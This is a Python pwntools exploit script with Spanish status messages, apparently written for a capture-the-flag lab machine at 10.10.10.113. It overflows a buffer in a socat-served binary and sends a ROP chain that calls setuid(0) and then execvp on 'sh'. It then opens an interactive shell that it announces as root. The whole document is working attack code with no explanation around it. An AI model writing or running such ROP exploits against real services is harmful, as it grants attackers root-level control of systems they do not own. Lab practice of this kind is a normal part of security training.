#!/usr/bin/env python3

from pwn import *
import sys, signal

def def_handler(sig, frame):
    print(f"\n[!] Saliendo...\n")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

if __name__ == '__main__':
    
    offset = 29
    junk = b"allow" + b"A" * offset
    
    pop_rdi = p64(0x400de3)
    pop_rsi = p64(0x400de1)
    null = p64(0x0)
    
    setuid = p64(0x400780)
    execvp = p64(0x400760)
    sh_addr = p64(0x40046e)
    
    payload = junk
    payload += pop_rdi
    payload += null
    payload += setuid
    payload += pop_rdi
    payload += sh_addr
    payload += pop_rsi
    payload += null
    payload += null
    payload += execvp
    payload += b"\n1.1.1.1\n"
    
    try:
        log.info("Conectando al servicio socat...")
        p = remote("10.10.10.113", 9002)
        log.success("Conexión establecida")
        
        log.info("Enviando payload ROP...")
        p.sendline(payload)
        
        log.success("¡Shell obtenida como root!")
        p.interactive()
        
    except Exception as e:
        log.error(f"Error: {e}")
        sys.exit(1)